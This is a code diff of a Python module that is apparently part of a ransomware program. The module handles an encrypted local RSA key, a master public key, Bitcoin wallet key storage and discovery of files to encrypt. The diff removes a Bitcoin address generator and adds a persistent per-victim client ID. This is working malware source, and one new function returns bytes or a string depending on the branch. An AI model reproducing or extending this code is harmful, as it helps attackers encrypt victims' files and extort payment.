@@ -1,20 +1,20 @@
 import logging
 import hashlib
+import uuid
 from random import randint
 from os import urandom, remove, path, listdir
-from asymmetric_encryption import RSA, ECC
-from config import (
+from core.crypto.asymmetric_encryption import RSA, ECC
+from .config import (
     ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
     MASTER_PUBLIC_KEY,
     ENCRYPTED_BITCOIN_KEY_LOCATION,
     BITCOIN_WALLET_ID_PATH,
     REQUIRED_FILE_FORMAT,
+    CLIENT_ID_LOCATION
 )
 from pickle import load, dump, HIGHEST_PROTOCOL
 
-
 logger = logging.getLogger(__name__)
-
 
 def write_data_to_file(file_path, data, serialized=True):
     logger.info(f"Writing data to {file_path}")
@@ -71,62 +71,13 @@ def generate_rsa_key_pair():
 
     return serialized_public_key
 
-
-def sha256(data):
-    sha256 = hashlib.sha256()
-    sha256.update(data)
-    return sha256.hexdigest()
-
-
-def ripemd160(data):
-    ripemd160 = hashlib.new("ripemd160")
-    ripemd160.update(data)
-    return ripemd160.hexdigest()
-
-
-def base58(data):
-    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
-    b58_string = ""
-
-    leading_zeros = len(data) - len(data.lstrip("0"))
-    address_int = int(data, 16)
-
-    while address_int > 0:
-        digit = address_int % 58
-        digit_char = alphabet[digit]
-        b58_string = digit_char + b58_string
-        address_int //= 58
-    ones = leading_zeros // 2
-    for one in range(ones):
-        b58_string = "1" + b58_string
-
-    return b58_string
-
-
-def generate_bitcoin_address():
-    logger.info("Generating ECC key pair")
-    cipher = ECC()
-    serialized_private_key = cipher.private_key
-    serialized_public_key = cipher.public_key
-
-    logger.info("Encrypting ECC private key")
-    cipher = RSA(public_key=MASTER_PUBLIC_KEY)
-    encrypted_private_key = cipher.encrypt_large_data(serialized_private_key)
-
-    logger.info("Storing encrypted ECC private key in disk")
-    write_data_to_file(ENCRYPTED_BITCOIN_KEY_LOCATION, encrypted_private_key, False)
-
-    logger.info("Generating Bitcoin Wallet Address from ECC Public key")
-    hashed_public_key_hex = ripemd160(bytes.fromhex(sha256(serialized_public_key)))
-    key_with_network_byte = f"00{hashed_public_key_hex}"
-    checksum = sha256(bytes.fromhex(sha256(bytes.fromhex(key_with_network_byte))))
-    hex_address = f"{key_with_network_byte}{checksum[:8]}"
-    wallet_address = base58(hex_address)
-
-    write_data_to_file(BITCOIN_WALLET_ID_PATH, wallet_address.encode("utf-8"))
-
-    return wallet_address
-
+def get_client_id():
+    if path.exists(CLIENT_ID_LOCATION):
+        client_id = read_data_from_file(CLIENT_ID_LOCATION).decode()
+    else:
+        client_id = str(uuid.uuid4()).encode()
+        write_data_to_file(CLIENT_ID_LOCATION, client_id)
+    return client_id
 
 def get_files_to_be_encrypted(directory):
     logger.info(f"Discovering files in {directory}")
